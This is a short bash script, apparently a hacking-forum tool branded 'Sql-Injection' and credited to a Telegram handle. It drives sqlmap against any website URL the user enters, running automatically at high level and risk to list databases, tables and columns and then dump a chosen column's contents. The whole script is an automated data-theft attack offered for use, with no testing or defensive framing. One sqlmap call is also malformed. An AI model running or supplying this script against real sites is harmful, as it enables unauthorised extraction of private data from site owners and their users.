#!/bin/bash
clear
g='\e[1;32m'
c='\e[1;36m'
r='\e[1;31m'
b='\e[1;34m'
w='\e[1;37m'
y='\e[1;33m'

echo ""
echo ""
echo ""


echo -e $r '  _____       _            _____       _           _   _ '
echo -e $r ' / ____|     | |          |_   _|     (_)         | | (_) '
echo -e $r '| (___   __ _| |  ______    | |  _ __  _  ___  ___| |_ _  ___  _ __ '
echo -e $r ' \___ \ / _` | | |______|   | | |  _ \| |/ _ \/ __| __| |/ _ \|  _ \ '
echo -e $r ' ____) | (_| | |           _| |_| | | | |  __/ (__| |_| | (_) | | | | '
echo -e $r '|_____/ \__, |_|          |_____|_| |_| |\___|\___|\__|_|\___/|_| |_| '
echo -e $r '           | |                       _/ | '
echo -e $r "           |_|                      |__/ $g The The Script By:$w ProMst3r X4 "
echo -e $r "                                          $g  Telegram:$w t.me/ProMast3r_X4"

echo ""
echo ""
echo "" 



cd $HOME/sqlmap/

echo -e $g
read -p "[+] Enter The Website ^> " site
python2 sqlmap.py -u $site --dbs s--  level=3 --risk=3 --batch

echo -e $g
read -p "[+] Enter The Name Database ^> " database

python2 sqlmap.py -u $site -D $database --tables --level=3 --risk=3 --batch

echo -e $g
read -p "[+] Enter The Name Table ^> " table
python2 sqlmap.py -u $site -D $database -T $table --columns --level=3 --risk=3 --batch

echo -e $g
read -p "[+] Enter The Name Column ^> " column
python2 sqlmap.py -u $site -D $database -T $table -C $column --dump --level=3 --risk=3 --batch

echo ""
echo -e $r ""
read -p "Done......."
